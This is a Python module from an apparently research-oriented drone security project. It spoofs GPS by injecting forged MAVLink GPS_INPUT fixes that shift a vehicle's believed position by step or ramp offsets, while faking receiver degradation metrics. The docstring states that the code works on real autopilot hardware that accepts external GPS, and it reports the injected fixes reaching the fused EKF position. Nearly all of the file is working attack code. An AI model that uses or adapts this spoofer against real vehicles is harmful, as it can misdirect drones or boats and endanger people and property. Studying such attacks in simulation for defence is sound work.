"""
GPS_INPUT-based GPS spoofing -- the protocol-standard, autopilot-agnostic
alternative to attacks/gps_spoof.py's FDM-relay interception.

Where gps_spoof.py sits in front of ArduPilot's OWN proprietary JSON SITL
protocol (real, zero-setup, but ArduPilot-specific), this module attacks
the standard MAVLink `GPS_INPUT` message (#232, ArduPilot's AP_GPS_MAV
driver, enabled via GPS1_TYPE=14) -- the same interface PX4 formalizes as
its official "Simulator MAVLink API" (HIL_GPS/GPS_INPUT family). It works
against any MAVLink autopilot configured to accept external GPS, real
hardware included, not just this project's own vehicles.

Confirmed empirically (2026-08-07) against a bare ArduPilot SITL with
GPS1_TYPE=14: an injected fix appears in both GPS_RAW_INT (raw ingestion,
pre-fusion) and GLOBAL_POSITION_INT (fused EKF belief) within ~0.5s.

Physics realism is NOT traded away by using this instead of gps_spoof.py's
relay -- whatever engine feeds a target's legitimate GPS_INPUT stream (if
any) can still be running full hydrodynamics; this module just competes
with/overrides whatever arrives on the same channel, exactly what a real
attacker with MAVLink access would do.

Duplicated (not shared) from gps_spoof.py: the step/ramp offset math is
copied rather than factored into a common module, matching gps_spoof.py's
own "verified working, do not change without re-testing" convention --
this file has its own, independent surface to modify.
"""
import math
import random
import time

M_PER_DEG_LAT = 111320.0


def m_per_deg_lon(lat):
    return M_PER_DEG_LAT * math.cos(math.radians(lat))


class InjectState:
    def __init__(self):
        self.active = False
        self.mode = None              # "step" or "ramp"
        self.start_time = None
        self.step_offset_m = 50.0
        self.ramp_rate_m_per_s = 0.5
        self.direction_deg = 90.0     # bearing to forge the offset toward (0=N, 90=E)
        # Front-end degradation parameters
        self.pseudorange_jitter_m = 0.18
        self.last_frontend_metrics = {
            "satellites": 14,
            "hdop": 0.8,
            "vdop": 0.9,
            "cno_drop_db": 0.0,
            "pseudorange_jitter_m": 0.0,
        }

    def offset_m(self):
        """Returns (north_offset_m, east_offset_m) to ADD to the baseline."""
        if not self.active:
            return 0.0, 0.0
        elapsed = time.time() - self.start_time
        bearing_rad = math.radians(self.direction_deg)
        if self.mode == "step":
            magnitude = self.step_offset_m
        elif self.mode == "ramp":
            magnitude = self.ramp_rate_m_per_s * elapsed
        else:
            return 0.0, 0.0

        # Inject RF front-end pseudorange jitter
        jitter_n = random.gauss(0.0, self.pseudorange_jitter_m)
        jitter_e = random.gauss(0.0, self.pseudorange_jitter_m)
        return magnitude * math.cos(bearing_rad) + jitter_n, magnitude * math.sin(bearing_rad) + jitter_e


def send_gps_input(conn, lat, lon, alt, gps_id=0, fix_type=3, satellites=14,
                   hdop=0.8, vdop=0.9, speed_acc=0.1, horiz_acc=0.6, vert_acc=0.9):
    conn.mav.gps_input_send(
        int(time.time() * 1e6),  # time_usec
        gps_id,
        0,                        # ignore_flags: 0 = use all fields
        0, 0,                     # time_week_ms, time_week
        fix_type,
        int(lat * 1e7), int(lon * 1e7), alt,
        hdop, vdop,
        0.0, 0.0, 0.0,            # vn, ve, vd
        speed_acc,
        horiz_acc, vert_acc,
        satellites,
    )


def run_gps_input_feed(conn, lat0, lon0, alt0, state, gps_id, stop_event, hz=8.0):
    """Continuously sends GPS_INPUT at `hz` Hz with RF front-end degradation modeling:
    - Normal baseline: 14 satellites, HDOP 0.8, high fix precision.
    - Active spoofing: C/N0 drop, HDOP spike (3.2-4.5), satellite count drop (6-8),
      and pseudorange Gaussian jitter simulating receiver front-end degradation.
    """
    period = 1.0 / hz
    while not stop_event.is_set():
        off_n, off_e = state.offset_m()
        lat = lat0 + off_n / M_PER_DEG_LAT
        lon = lon0 + off_e / m_per_deg_lon(lat0)

        if state.active:
            sats = random.randint(6, 8)
            hdop = random.uniform(3.2, 4.5)
            vdop = random.uniform(3.5, 5.0)
            horiz_acc = random.uniform(3.0, 4.8)
            vert_acc = random.uniform(4.0, 6.0)
            speed_acc = random.uniform(0.6, 1.2)
            cno_drop = random.uniform(8.5, 14.0)
        else:
            sats = 14
            hdop = 0.8
            vdop = 0.9
            horiz_acc = 0.6
            vert_acc = 0.9
            speed_acc = 0.1
            cno_drop = 0.0

        state.last_frontend_metrics = {
            "satellites": sats,
            "hdop": round(hdop, 2),
            "vdop": round(vdop, 2),
            "cno_drop_db": round(cno_drop, 1),
            "pseudorange_jitter_m": state.pseudorange_jitter_m if state.active else 0.0,
        }

        send_gps_input(conn, lat, lon, alt0, gps_id=gps_id, satellites=sats,
                       hdop=hdop, vdop=vdop, speed_acc=speed_acc,
                       horiz_acc=horiz_acc, vert_acc=vert_acc)
        stop_event.wait(period)
